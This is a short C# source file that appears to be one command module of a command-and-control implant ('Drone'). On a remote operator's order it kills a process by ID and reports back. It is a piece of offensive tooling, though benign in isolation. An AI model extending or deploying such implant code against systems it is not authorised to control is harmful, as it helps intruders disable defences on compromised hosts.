using System.Diagnostics;
using System.Threading;

namespace Drone.Commands;

public class KillProcess : DroneCommand
{
    public override byte Command => 0x1F;
    public override bool Threaded => false;
    
    public override void Execute(DroneTask task, CancellationToken cancellationToken)
    {
        var pid = task.Arguments[0];
        
        using var process = Process.GetProcessById(int.Parse(pid));
        process.Kill();
        
        Drone.SendTaskOutput(task.Id, $"Killed PID {pid} ({process.ProcessName}).");
    }
}